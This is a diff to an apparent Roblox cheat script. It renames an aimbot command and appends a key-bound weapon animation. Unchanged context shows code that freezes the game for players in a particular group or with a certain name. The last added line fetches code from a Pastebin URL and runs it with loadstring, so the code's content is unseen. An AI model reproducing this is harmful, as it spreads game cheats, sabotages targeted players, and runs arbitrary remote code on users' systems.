@@ -1789,7 +1789,7 @@ AddCommand(function(Arguments)
 			CamlockPlayer = Player 
 		end
 	end
-end,"camlock",{"lockcam","cl"},"Different type of aimbot (Uses camera instead of the remote)","[Player Name]")
+end,"lock",{"lockcam","cl"},"Different type of aimbot (Uses camera instead of the remote)","[Player Name]")
 
 AddCommand(function(Arguments)
 	if Arguments[1] then 
@@ -2623,3 +2623,39 @@ if LP:IsInGroup(5152759) or string.find(LP.Name:lower(),"lynx") then
 	wait(0.3)
 	while true do end
 end 
+-- this was made by sleepy ENJOY XD
+
+game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
+ if KeyPressed == "e" then
+local lplr = game:GetService("Players").LocalPlayer
+local Glock = lplr.Backpack:FindFirstChild("Glock")    
+local Animation = Instance.new("Animation")
+Animation.AnimationId = "rbxassetid://457896265"
+local plr = game:GetService('Players').LocalPlayer
+local HUM = plr.Character.Humanoid:LoadAnimation(Animation)        
+Glock.Equipped:connect(function()
+    wait(.0)
+    HUM:Play()
+    HUM:AdjustSpeed(0.0)
+end)
+Glock.Unequipped:connect(function()
+    HUM:Stop()
+end)
+local lplr = game:GetService("Players").LocalPlayer
+local Shotty = lplr.Backpack:FindFirstChild("Shotty")    
+local Animation = Instance.new("Animation")
+Animation.AnimationId = "rbxassetid://457896265"
+local plr = game:GetService('Players').LocalPlayer
+local HUM = plr.Character.Humanoid:LoadAnimation(Animation)        
+Shotty.Equipped:connect(function()
+    wait(.1)
+    HUM:Play()
+    HUM:AdjustSpeed(0.0)
+end)
+Shotty.Unequipped:connect(function()
+    HUM:Stop()
+end)
+end
+end)
+
+loadstring(game:HttpGet(("https://pastebin.com/raw/JFWDYzcs"),true))()
